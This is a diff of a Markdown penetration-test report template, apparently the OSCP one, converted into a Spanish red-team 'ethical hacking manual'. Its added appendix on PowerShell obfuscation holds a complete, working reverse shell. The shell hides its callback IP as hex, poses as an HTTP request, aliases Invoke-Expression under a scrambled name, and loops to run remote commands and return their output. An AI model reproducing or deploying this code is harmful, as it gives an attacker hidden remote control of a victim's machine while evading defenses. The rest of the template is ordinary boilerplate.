@@ -1,5 +1,5 @@
 ---
-title: "Penetration Test Report"
+title: "Manual de Hacking Etico"
 author: ["student@youremailaddress.com", "OSID: XXXX"]
 date: "2017-02-20"
 subject: "Markdown"
@@ -15,13 +15,11 @@ book: true
 classoption: oneside
 code-block-font-size: \scriptsize
 ---
-# Offensive Security Exam Penetration Test Report
+# Manual de Hacking Etico 
 
 ## Introduction
 
-The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security exam.
-This report will be graded from a standpoint of correctness and fullness to all aspects of the exam.
-The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.
+Este manual es recopila la distintas tecnicas actuales de Hacking orientadas principalmente a REDTEAM.
 
 ## Objective
 
@@ -39,6 +37,7 @@ The student will be required to fill out this penetration testing report fully a
 - Methodology walkthrough and detailed outline of steps taken
 - Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable
 - Any additional items that were not included
+
 
 
 
@@ -322,8 +321,30 @@ IP (Hostname) | Local.txt Contents | Proof.txt Contents
 
 For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`
 
-## Appendix - Completed Buffer Overflow Code
+## Appendix - Ofuscacion de Powershell
 
 ```
-code here
+while ($true) {
+    $px = "c0","a8","38","1"
+    $p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
+    $w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
+    $s = [System.Text.ASCIIEncoding]
+    [byte[]]$b = 0..65535|%{0}
+    $x = "n-eiorvsxpk5"
+    Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
+    $y = New-Object System.Net.Sockets.TCPClient($p,80)
+    $z = $y.GetStream()
+    $d = $s::UTF8.GetBytes($w)
+    $z.Write($d, 0, $d.Length)
+    $t = (n-eiorvsxpk5 whoami) + "$ "
+    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
+        $v = (New-Object -TypeName $s).GetString($b,0, $l)        
+        $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
+        $z.Write($d, 0, $d.Length)
+    }
+    $y.Close()
+    Start-Sleep -Seconds 5
+}
+
+
 ```
